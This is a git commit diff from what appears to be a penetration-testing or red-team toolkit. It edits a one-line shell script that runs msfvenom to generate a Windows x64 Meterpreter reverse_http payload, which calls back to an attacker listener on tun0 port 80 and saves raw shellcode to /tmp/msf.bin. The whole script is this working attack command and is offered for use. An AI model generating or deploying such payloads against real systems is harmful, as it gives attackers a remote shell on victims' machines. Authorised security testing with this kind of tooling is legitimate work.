d0960f54dc1477face4fbc3a1ee59308bde46033
Simon Clow <sc@sclow.com>
2021-02-02 16:52:39 +0000

    Added configuration options for profiles

--- supporting/metasploit/envenomate.sh
+++ supporting/metasploit/envenomate.sh
@@ -1,2 +1,2 @@
 #!/bin/sh
-msfvenom -p windows/x64/meterpreter/reverse_http LHOST=tun0 LPORT=80 LURI=/MSF EXITFUNC=thread -f raw -o /tmp/msf.bin
+msfvenom -p windows/x64/meterpreter/reverse_http --platform windows LHOST=tun0 LPORT=80 LURI=/MSF/ EXITFUNC=thread -f raw -o /tmp/msf.bin
